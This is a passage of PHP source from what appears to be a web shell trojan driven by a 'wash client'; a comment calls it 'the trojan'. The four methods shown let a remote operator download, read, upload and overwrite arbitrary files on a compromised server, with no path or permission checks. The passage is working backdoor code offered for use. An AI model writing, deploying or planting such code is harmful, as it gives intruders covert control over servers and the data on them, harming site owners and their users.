/**
 * Downloads a file
 *
 * @param string $args             Arguments passed from the wash client
 */
public function payload_file_down($args){
    # emulate directory persistence
    chdir($this->cwd);
    # if the requested file exists, serve it up to the user
    if(file_exists($args['file'])){
        header('Content-Disposition: attachment; filename='.basename($args['file']));
        header('Content-Transfer-Encoding: binary');
        readfile($args['file']);
    }
    
    # if not, provide a notification
    else { echo "File does not exist."; }
    die();
}

/**
 * Edits a file on the server
 */
public function payload_file_read($args){
    # cd to the appropriate directory
    chdir($this->cwd);

    # Verify that file is readable. 
    if(!is_readable($args['file'])){
        $this->response['error'] = 'File is not readable or does not exist.';
    } else {
        # double-up on the output here
        $this->response['output'] = array(
            # echo back the contents of the file
            'output' => file_get_contents($args['file']),
            # also pass back the absolute path to the file being read
            'file'   => realpath($args['file']),
        );
    }
    $this->send_response();
}

/**
 * Uploads files to the target server
 */
public function payload_file_up($args){
    # cd to the appropriate directory
    chdir($this->cwd);

    foreach ($_FILES["files_up"]["error"] as $key => $error) {
        if ($error == UPLOAD_ERR_OK) {
            $tmp_name = $_FILES["files_up"]["tmp_name"][$key];
            $name     = $_FILES["files_up"]["name"][$key];
            $result = move_uploaded_file($tmp_name, "./$name");
        }
    }

    echo ($result) ? "success" : "failure";
    die();
}

/**
 * Writes a file to the server
 */
public function payload_file_write($args){
    # cd to the appropriate directory
    chdir($this->cwd);

    # Attempt to write the file, and notify the user of the result. Again,
    # I'm combining several error checks here just to keep the trojan small.
    if(!file_put_contents($args['file'], $args['data'])){
        $this->response['error'] = 'Failed. File may not be writable, or may not exist.';
    }
    else {
        $this->response['output'] = 'Write successful.';
    }
    $this->send_response();
}
